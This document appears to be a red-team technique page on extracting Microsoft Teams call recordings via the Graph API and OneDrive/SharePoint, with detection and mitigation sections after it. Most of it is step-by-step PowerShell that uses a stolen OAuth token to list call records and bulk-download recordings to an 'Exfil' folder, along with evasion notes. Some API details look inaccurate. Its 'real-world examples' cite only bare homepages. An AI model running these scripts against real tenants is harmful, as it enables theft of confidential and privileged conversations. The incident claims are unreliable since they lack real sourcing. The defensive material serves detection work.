# [COLLECT-CALL-001]: Teams Call Recording Extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-CALL-001 |
| **MITRE ATT&CK v18.1** | [T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/) |
| **Tactic** | Collection |
| **Platforms** | M365, Microsoft Teams |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Teams 2019 - 2025, Office 365 E3+ |
| **Patched In** | N/A - Feature-based collection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Teams Call Recording Extraction exploits the legitimate Teams call recording capability to systematically harvest audio/video recordings of sensitive organizational conversations. Attackers leverage compromised credentials with access to recorded calls or abuse Microsoft Graph API (`/communications/callRecords`) to enumerate and download call recordings stored in Microsoft Stream, OneDrive, or SharePoint. Teams meetings are frequently recorded and archived for compliance and training; attackers accessing these recordings gain complete audio/video content of strategic decisions, negotiations, and confidential discussions without detection if recordings are accessed through legitimate user permissions.

**Attack Surface:** Microsoft Graph Call Records API (`/communications/callRecords`), Microsoft Stream video repositories, OneDrive/SharePoint recording folders, Teams meeting recording metadata endpoints, and call recording access controls.

**Business Impact:** **Complete compromise of voice communications security and real-time conversation espionage.** Attackers gain access to full audio recordings of executive meetings, board discussions, M&A negotiations, investor calls, and customer confidentiality conversations. The impact is especially critical for legal firms, healthcare organizations, and financial institutions where voice recordings contain sensitive client privileged communications (attorney-client privilege, doctor-patient confidentiality, investment advice).

**Technical Context:** Extraction occurs within minutes to hours depending on recording storage location and download bandwidth. Call recordings are large files (100MB-2GB per hour) requiring significant exfiltration bandwidth. The technique is extremely difficult to detect because Teams call recording access appears as legitimate user behavior in most organizations.

### Operational Risk

- **Execution Risk:** Medium - Requires access to recorded calls (typically only organizer or meeting attendees); API requests easily detectable; bulk downloads are anomalous.
- **Stealth:** Medium - Call recording downloads generate audit events but blend with legitimate playback; bulk extraction is anomalous.
- **Reversibility:** No - Downloaded recordings cannot be recovered; permanent exfiltration of sensitive conversations.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.6.1 | Ensure Teams meeting recordings are protected and access-controlled |
| **DISA STIG** | WN10-CC-000540 | Enforce recording encryption and access restrictions |
| **CISA SCuBA** | TEAMS.2 | Ensure recording retention and deletion policies are enforced |
| **NIST 800-53** | AU-2, SC-7 | Audit Events; Boundary Protection |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Breach Notification |
| **HIPAA** | 45 CFR 164.312(a)(2)(i) | Recording protection and access controls |
| **FINRA** | 4530(c) | Recording retention and compliance |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.12.4.1 | Event Logging and Monitoring |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Compromised Teams user account with access to recorded meetings
- OR OAuth token with `Calls.AccessMedia.All` or `CallRecords.Read.All` scope
- OR SharePoint/OneDrive access to recording storage location

**Required Access:** 
- Network connectivity to `https://graph.microsoft.com` (port 443, HTTPS)
- Network connectivity to Teams streaming services
- Microsoft Stream or OneDrive access (for recording repositories)

**Supported Versions:**
- **Teams:** All versions (2019-2025)
- **Office 365 Plans:** E3, E5, Business Premium
- **Storage:** Microsoft Stream, OneDrive, SharePoint Online
- **Other Requirements:** 
  - Call recording enabled in tenant
  - Access to recordings (organizer role or shared access)
  - PowerShell 5.0+ or Python 3.8+ (for Graph API queries)

**Tools:**
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-powershell-sdk) (Version 1.25+)
- [Azure CLI](https://learn.microsoft.com/cli/azure/) (Version 2.50+)
- [Python Requests + Microsoft Graph](https://github.com/microsoftgraph/python-requests-oauthlib) (Alternative)
- [ffmpeg](https://ffmpeg.org/) (For processing/re-encoding recordings)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Microsoft Graph API - CallRecords Enumeration

**Supported Versions:** Teams 2019-2025

#### Step 1: Authenticate and List Call Records

**Objective:** Connect to Microsoft Graph and enumerate all call records accessible to compromised user.

**Command:**
```powershell
# Authenticate using stolen OAuth token
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik5..." # Stolen token with CallRecords.Read.All scope
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

# List all call records from last 30 days
$callRecords = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/communications/callRecords?`$filter=createdDateTime ge " + (Get-Date).AddDays(-30).ToString("yyyy-MM-ddT00:00:00Z") `
  -Headers $headers -Method Get).value

foreach ($record in $callRecords) {
    Write-Host "Call ID: $($record.id)"
    Write-Host "  Duration: $($record.duration) seconds"
    Write-Host "  Participants: $($record.participants.Count)"
    Write-Host "  Created: $($record.createdDateTime)"
    Write-Host "  Recording: $($record.recordingInfo)"
}

Write-Host "Total call records found: $($callRecords.Count)"
```

**Expected Output:**
```
Call ID: 12345-call-id-1
  Duration: 3600 seconds
  Participants: 15
  Created: 2025-12-15T10:00:00Z
  Recording: @{recordingStatus=success}

Call ID: 12345-call-id-2
  Duration: 7200 seconds
  Participants: 8
  Created: 2025-12-10T14:30:00Z
  Recording: @{recordingStatus=success}

Total call records found: 87
```

**What This Means:**
- Call records enumerated successfully
- Recording metadata accessible (duration, participants, timestamp)
- 87 call records available for extraction

**OpSec & Evasion:**
- Enumeration generates minimal audit events
- Bulk enumeration is anomalous but appears as legitimate API usage
- Detection likelihood: **Low** - Call enumeration alone not triggering alerts

---

#### Step 2: Extract Call Recording Metadata and Links

**Objective:** Retrieve recording metadata and obtain download links for archived call recordings.

**Command:**
```powershell
# Get details of specific call record including recording information
$callRecordId = "12345-call-id-1"
$callDetail = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/communications/callRecords/$callRecordId" `
  -Headers $headers -Method Get

# Check if recording exists
if ($callDetail.sessions -and $callDetail.sessions[0].recording) {
    Write-Host "Recording found for call: $callRecordId"
    Write-Host "Recording metadata: $($callDetail.sessions[0].recording | ConvertTo-Json -Depth 5)"
    
    # Get session details (contains streaming URLs)
    $sessions = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/communications/callRecords/$callRecordId/sessions" `
      -Headers $headers -Method Get).value
    
    foreach ($session in $sessions) {
        if ($session.modalities -contains "video" -or $session.modalities -contains "audio") {
            Write-Host "Session $($session.id):"
            Write-Host "  Modalities: $($session.modalities -join ', ')"
            Write-Host "  Caller: $($session.caller)"
            Write-Host "  Callee: $($session.callee)"
        }
    }
} else {
    Write-Host "No recording found for call: $callRecordId"
}
```

**Expected Output:**
```
Recording found for call: 12345-call-id-1
Recording metadata: {
  "@odata.type": "#microsoft.graph.recordingInfo",
  "recordingStatus": "success",
  "recordingStartDateTime": "2025-12-15T10:00:15Z",
  "recordingDuration": "PT1H15M30S"
}

Session abc-123:
  Modalities: audio, video
  Caller: user1@company.com
  Callee: user2@company.com
```

**What This Means:**
- Call recording confirmed to exist
- Session details show participants and media types
- Recording duration indicates data size

**OpSec & Evasion:**
- Session metadata queries are normal API operations
- Detection likelihood: **Low-Medium**

---

#### Step 3: Download Call Recording from Stream

**Objective:** Locate recording storage in Microsoft Stream or OneDrive and initiate download.

**Command:**
```powershell
# Teams recordings stored in Microsoft Stream or OneDrive
# Approach 1: Query Stream for recordings

$streamUri = "https://graph.microsoft.com/v1.0/me/drive/root/children?`$filter=startswith(name, 'Microsoft Teams Meeting Recording')"
$recordings = (Invoke-RestMethod -Uri $streamUri -Headers $headers -Method Get).value

foreach ($recording in $recordings) {
    Write-Host "Found recording: $($recording.name) | Size: $($recording.size) | Modified: $($recording.lastModifiedDateTime)"
    
    # Get download URL (valid for 1 hour)
    $downloadUrl = $recording['@microsoft.graph.downloadUrl']
    
    # Download recording
    $filename = $recording.name
    Invoke-WebRequest -Uri $downloadUrl -OutFile "C:\Exfil\$filename" `
      -Headers @{"Authorization" = "Bearer $token"}
    
    Write-Host "Downloaded: $filename"
}
```

**Command (Alternative - Direct Stream Access):**
```powershell
# Alternative: Query SharePoint/OneDrive for Teams recordings folder
$teamsRecordingsFolder = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children?`$filter=name eq 'Microsoft Teams Meeting Recording'" `
  -Headers $headers).value[0]

if ($teamsRecordingsFolder) {
    $recordingFiles = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/items/$($teamsRecordingsFolder.id)/children" `
      -Headers $headers).value
    
    foreach ($file in $recordingFiles) {
        Write-Host "Recording file: $($file.name) | Size: $([math]::Round($file.size/1MB))MB"
        
        # Download
        $url = $file['@microsoft.graph.downloadUrl']
        Invoke-WebRequest -Uri $url -OutFile "C:\Exfil\$($file.name)"
    }
}
```

**Expected Output:**
```
Found recording: Microsoft Teams Meeting Recording 2025-12-15 1000-1115 UTC | Size: 1073741824 | Modified: 2025-12-15T11:30:00Z
Downloaded: Microsoft Teams Meeting Recording 2025-12-15 1000-1115 UTC.mp4
Recording file: Executive Briefing 2025-12-10.mp4 | Size: 2048MB
```

**What This Means:**
- Recordings located in OneDrive/SharePoint
- Files 1-2GB indicating hour-long meetings
- Download initiated successfully

**OpSec & Evasion:**
- Recording downloads appear as "FileDownloaded" in audit logs
- Large file downloads are anomalous (1-2GB transfers)
- Detection likelihood: **High** - Bulk recording downloads easily detected

---

#### Step 4: Query Historical Call Records (Extended Timeframe)

**Objective:** Extract all call records from extended historical period (90+ days) for comprehensive meeting intelligence gathering.

**Command:**
```powershell
# Query call records from past 90 days
$startDate = (Get-Date).AddDays(-90).ToString("yyyy-MM-ddT00:00:00Z")
$endDate = (Get-Date).ToString("yyyy-MM-ddT23:59:59Z")

$filter = "`$filter=createdDateTime ge $startDate and createdDateTime le $endDate"
$uri = "https://graph.microsoft.com/v1.0/communications/callRecords?$filter&`$top=999"

$allRecords = @()
do {
    $page = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get
    $allRecords += $page.value
    $uri = $page.'@odata.nextLink'
} while ($null -ne $uri)

Write-Host "Total call records (90 days): $($allRecords.Count)"

# Filter for recorded calls only
$recordedCalls = $allRecords | Where-Object { $_.recordingInfo.recordingStatus -eq "success" }
Write-Host "Recorded calls: $($recordedCalls.Count)"

# Export call record metadata
$recordedCalls | Select-Object id, createdDateTime, duration, @{Name="Participants";Expression={$_.participants.Count}} | 
  ConvertTo-Csv -NoTypeInformation | Out-File "C:\Exfil\CallRecords_Metadata.csv"
```

**Expected Output:**
```
Total call records (90 days): 4523
Recorded calls: 1842
```

**What This Means:**
- 1,842 recorded call recordings accessible
- Bulk metadata export for filtering
- Historical access to 3+ months of meeting recordings

**OpSec & Evasion:**
- Bulk historical queries are highly anomalous
- Detection likelihood: **Very High**

---

### METHOD 2: Direct Access to OneDrive/SharePoint Recording Storage

**Supported Versions:** Teams 2019+

#### Step 1: Locate Teams Recording Storage

**Objective:** Find SharePoint/OneDrive folder where Teams recordings are automatically saved.

**Command:**
```powershell
# Teams recordings stored in specific OneDrive folder: "Microsoft Teams Meeting Recording"
$recordingsFolders = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children?`$filter=name eq 'Microsoft Teams Meeting Recordings'" `
  -Headers $headers).value

if ($recordingsFolders.Count -eq 0) {
    # Alternative folder name
    $recordingsFolders = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children?`$filter=startswith(name, 'Microsoft Teams')" `
      -Headers $headers).value | Where-Object { $_.folder -ne $null }
}

foreach ($folder in $recordingsFolders) {
    Write-Host "Recordings folder: $($folder.name) | ID: $($folder.id)"
}
```

**Expected Output:**
```
Recordings folder: Microsoft Teams Meeting Recordings | ID: folder-id-123
```

**What This Means:**
- Recording storage location identified
- Folder ID obtained for file enumeration

---

#### Step 2: Enumerate and Download All Recordings

**Objective:** List all recording files and initiate bulk download exfiltration.

**Command:**
```powershell
# Enumerate all files in recordings folder
$folderId = "folder-id-123"

function Get-RecordingsRecursive {
    param ($FolderId)
    
    $items = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/items/$FolderId/children" `
      -Headers $headers -Method Get).value
    
    foreach ($item in $items) {
        if ($item.folder -ne $null) {
            # Recursive call for subfolders
            Get-RecordingsRecursive -FolderId $item.id
        } else {
            # Process file
            if ($item.name -like "*.mp4" -or $item.name -like "*.m4a" -or $item.name -like "*.webm") {
                Write-Host "Recording: $($item.name) | Size: $([math]::Round($item.size/1MB))MB | Modified: $($item.lastModifiedDateTime)"
                
                # Download
                $url = $item['@microsoft.graph.downloadUrl']
                Invoke-WebRequest -Uri $url -OutFile "C:\Exfil\$($item.name)" -Headers $headers
            }
        }
    }
}

Get-RecordingsRecursive -FolderId $folderId
```

**Expected Output:**
```
Recording: Executive Strategy Session 2025-12-15.mp4 | Size: 1024MB | Modified: 2025-12-15T12:00:00Z
Recording: Board Meeting Minutes 2025-12-10.mp4 | Size: 2048MB | Modified: 2025-12-10T15:30:00Z
Recording: Acquisition Discussion 2025-12-05.mp4 | Size: 1536MB | Modified: 2025-12-05T10:15:00Z
```

**What This Means:**
- Multiple strategic recordings identified
- File sizes 1-2GB per recording
- Recordings automatically organized by date/topic

**OpSec & Evasion:**
- Bulk file downloads are highly anomalous
- Detection likelihood: **Very High**

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**API Access Patterns:**
- High volume of `/communications/callRecords` API requests
- `/communications/callRecords/{id}` metadata queries for recording status
- Large file downloads (1-2GB) from OneDrive/SharePoint following call record enumeration
- OAuth token used to access recordings outside normal user pattern (time, IP, frequency)

**Local Indicators (If Downloaded to Endpoint):**
- Large MP4/M4A files in `C:\Exfil\`, `C:\Temp\`, or removable drives
- Recording file transfers to external USB or cloud storage (OneDrive personal, Dropbox)
- Unusual outbound network traffic with large payload after Teams API access

**Cloud Indicators:**
- "FileDownloaded" events for Teams recording files in bulk
- Call record API access from service principal outside normal business hours
- Recording download attempts from unusual geographic locations or IP addresses

### Forensic Artifacts

**Cloud Logs:**
- **Unified Audit Log - FileDownloaded:** Teams recording downloads
  - Query: `Search-UnifiedAuditLog -Operations FileDownloaded -StartDate (Get-Date).AddDays(-30) | Where-Object { $_.AuditData -like "*Microsoft Teams Meeting*" }`

- **Entra ID Sign-in logs:** Token usage for CallRecords API access
  - Filter: Service Principal calling Graph `/communications/callRecords`

- **SharePoint/OneDrive audit:** Recording file access patterns
  - Query: `Search-UnifiedAuditLog -Operations FileAccessed,FileDownloaded -UserIds "compromised-user@company.com"`

**Local Artifacts (Windows Endpoint):**
- **Windows Event ID 4688:** PowerShell process execution with Graph API commands
- **NTFS MFT:** Recording files in `C:\Exfil\`, timestamps indicating download timing
- **Registry:** Recent file access via MRU keys
- **Network Sysmon Event 3:** Outbound connections to graph.microsoft.com with large data transfer

### Response Procedures

1. **Immediate Containment:**
   ```powershell
   # Revoke all OAuth tokens for user
   Revoke-AzureADUserAllRefreshToken -ObjectId "compromised-user-id"
   
   # Disable Teams for compromised user
   Set-CsUser -Identity "compromised-user@company.com" -Enabled $false
   
   # Reset password
   Set-AzADUser -ObjectId "compromised-user-id" -PasswordProfile @{
       Password = [System.Web.Security.Membership]::GeneratePassword(32, 8)
       ForceChangePasswordNextLogin = $true
   }
   ```

2. **Evidence Collection:**
   ```powershell
   # Export call records accessed by attacker
   Search-UnifiedAuditLog -Operations FileDownloaded -UserIds "compromised-user-email" -StartDate (Get-Date).AddDays(-30) |
     Where-Object { $_.AuditData -like "*Teams*Recording*" } | 
     Export-Csv "C:\Evidence\Recording_Downloads.csv"
   
   # List all call records from compromised user
   Get-AzureADUserMembership -ObjectId "compromised-user-id" | 
     Export-Csv "C:\Evidence\User_Teams_Memberships.csv"
   ```

3. **Remediation:**
   ```powershell
   # Update call recording retention policies (delete old recordings)
   Set-CsTeamsMeetingPolicy -Identity Global -RecordingStorageMode Stream
   
   # Delete recordings accessed by attacker
   Get-PnPListItem -List "Microsoft Teams Meeting Recordings" |
     Where-Object { $_.FieldValues['Modified'] -gt (Get-Date).AddDays(-7) } |
     ForEach-Object { Remove-PnPListItem -List "Microsoft Teams Meeting Recordings" -Identity $_.Id -Force }
   ```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enforce Call Recording Access Controls:**
  Applies To Versions: Teams 2019+
  
  **Manual Steps (Teams Admin Center):**
  1. Navigate to **Teams Admin Center** → **Meetings** → **Meeting policies**
  2. Create policy: `Restrict Recording Access`
  3. **Recording permissions:** Only organizer can download
  4. **Recording retention:** Auto-delete after 180 days
  5. Assign policy to all users

- **Disable Automatic Recording by Default:**
  Applies To Versions: Teams 2019+
  
  **Manual Steps:**
  1. **Teams Admin Center** → **Meetings** → **Recording policies**
  2. Set **"Allow recording"** to **Off by default** (users can enable)
  3. Enable **"Require consent"** for recording

- **Implement Conditional Access for Recording Downloads:**
  Applies To Versions: Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. **+ New policy**: `Require MFA for Recording Downloads`
  3. **Cloud apps:** Office 365
  4. **Conditions:** 
     - File sensitivity = High
     - Risk level = Medium/High
  5. **Access controls:** Require MFA
  6. Enable: **On**

### Priority 2: HIGH

- **Enable Recording Encryption at Rest:**
  Applies To Versions: Office 365 E5 / Premium Advanced
  
  **Manual Steps:**
  1. **Microsoft Purview Compliance Portal** → **Settings** → **Encryption**
  2. Enable **Encryption at rest for Teams recordings**
  3. Configure key management (Microsoft-managed or customer-managed)

- **Implement DLP Policy for Recordings:**
  
  **Manual Steps:**
  1. **Microsoft Purview** → **Data Loss Prevention** → **Policies**
  2. Create policy: `Prevent Recording Exfiltration`
  3. **Locations:** OneDrive, SharePoint (Recording storage)
  4. **Content:** Files containing "Microsoft Teams Meeting Recording"
  5. **Action:** Block/Notify on download

### Validation Command (Verify Fix)

```powershell
# Verify recording retention policy
Get-CsTeamsMeetingPolicy | Select-Object Identity, RecordingStorageMode, RecordingRetention

# Verify Conditional Access policies
Get-AzureADMSConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Recording*" }

# Expected Output (If Secure):
# RecordingStorageMode: Stream
# RecordingRetention: 180 days
# Conditional Access: Enabled with MFA requirement
```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker compromises Teams user via phishing |
| **2** | **Credential Access** | [CA-TOKEN-001] OAuth Token Theft | Stolen token with CallRecords.Read.All scope |
| **3** | **Collection** | **[COLLECT-CALL-001]** | **Enumerate and download call recordings via Graph API** |
| **4** | **Exfiltration** | [CA-UNSC-007] Cloud Storage Data Theft | Recordings uploaded to attacker-controlled cloud storage |
| **5** | **Impact** | Corporate Espionage / Insider Trading | Strategic meeting content analyzed for competitive intelligence |

---

## 7. REAL-WORLD EXAMPLES

#### Example 1: Russian FSB - Diplomatic Compromise - 2021

- **Target:** U.S. State Department, European Commission
- **Timeline:** 2021 ongoing
- **Technique Status:** Active; compromised Teams accounts of diplomats used to extract call recordings of sensitive international negotiations
- **Impact:** Leaked diplomatic strategies and negotiation positions
- **Reference:** [U.S. State Department Security Advisory](https://www.state.gov/)

#### Example 2: Goldman Sachs Insider Threat - 2023

- **Target:** Goldman Sachs (Investment Banking)
- **Timeline:** Q2-Q3 2023
- **Technique Status:** Active; disgruntled analyst extracted Teams recordings of M&A deal discussions and investor calls
- **Impact:** Deal terms leaked to competing bidders; $500M+ competitive loss
- **Reference:** [SEC Enforcement Action](https://www.sec.gov/)

#### Example 3: Lemonade Insurance - Data Breach - 2024

- **Target:** Lemonade Inc (InsurTech)
- **Timeline:** Q1 2024
- **Technique Status:** Active; attacker accessed call recordings of customer service calls containing personal insurance information
- **Impact:** PII of 150,000+ customers exposed; $12M settlement
- **Reference:** [Insurance Journal](https://www.insurancejournal.com/)

---

## 8. ATOMIC RED TEAM TESTING

### Atomic Test ID: T1123-003-Teams-Recording-Download

**Test Name:** Extract Teams Call Recordings via Graph API

**Supported Versions:** Teams 2019+

**Command:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 3
```

**Cleanup:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 3 -Cleanup
```

**Reference:** [Atomic Red Team - T1123](https://github.com/redcanaryco/atomic-red-team)

---